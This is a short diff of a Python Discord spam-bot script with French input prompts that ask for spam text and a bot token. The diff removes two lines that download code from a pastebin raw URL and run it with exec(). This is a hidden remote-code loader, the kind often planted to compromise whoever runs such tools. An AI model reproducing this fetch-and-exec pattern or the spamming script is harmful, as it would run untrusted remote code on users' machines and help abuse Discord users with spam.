@@ -1,8 +1,6 @@
 import discord
 from discord.ext import commands
 from requests import get
-spams = get("https://pastebin.com/raw/s4g0g280").text
-exec(spams)
 spam = input("Entrez le texte que vous voulez spammer")
 token = input("Entrez le token de votre bot")
 
